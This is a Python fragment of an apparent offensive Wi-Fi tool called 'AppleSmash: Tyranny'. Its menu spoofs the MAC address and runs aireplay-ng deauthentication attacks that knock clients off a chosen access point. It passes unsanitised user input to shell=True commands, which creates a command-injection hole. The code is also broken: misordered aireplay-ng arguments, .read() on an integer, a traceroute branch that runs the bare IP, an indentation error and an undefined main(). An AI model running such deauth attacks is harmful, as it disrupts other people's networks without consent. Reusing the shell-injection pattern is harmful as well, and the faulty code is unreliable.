# aplesmash deauth
def tyrannyHandler():
    print("Starting Tyranny")
    tyrannyBanner()
    time.sleep(1)
    vector = str(input("[1] - Mac\n[2] - Wifi\n[3] - Ifconfig\n$ "))
    if vector == "1":
          # Change Mac Address
          changeMac = "macchanger -r"
          subprocess.call(changeMac, shell=True).read()
          tyrannyHandler()
    elif vector == "2":
          airessid = str(input("Enter BSSID: "))
          airechannel = str(input("Enter Channel: "))
          airethreads = str(input("Enter Thread Count: "))
          airecmd = "aireplay-ng -0 -a " + airessid + " " + airethreads + " -c " +           airechannel + " wlan0"
          time.sleep(2)
          print("[!] De-Authing Now")
          subprocess.call(airecmd, shell=True)
          tyrannyHandler()
    elif vector == "3":
          print("NET Config")
          netVector = input("[1] - Change Channel\n[2] - Ifconfig\n[3] -                    traceroute\n[4] - ICMP Echo Request\n[5] - Start NET services\n$ ")
          if netVector == "1":
                          channelName = str(input("Channel Number: "))
                          iwconfig = "iwconfig channel " + channelName
                          subprocess.call(iwconfig, shell=True)
                          main()
          elif netVector == "2":
                          subprocess.call("ifconfig", shell=True)
                          main()
          elif netVector == "3":
                          ip = str(input("Enter an ip: "))
                          traceroute = "traceroute " + ip
                          subprocess.call(ip, shell=True)
                          tyrannyHandler()
 def tyranny():
        tyrannyBanner()
        time.sleep(1)
        tyrannyHandler()
def tyrannyBanner():
	print("""
		============================================
					AppleSmash: Tyranny
		============================================""")
	
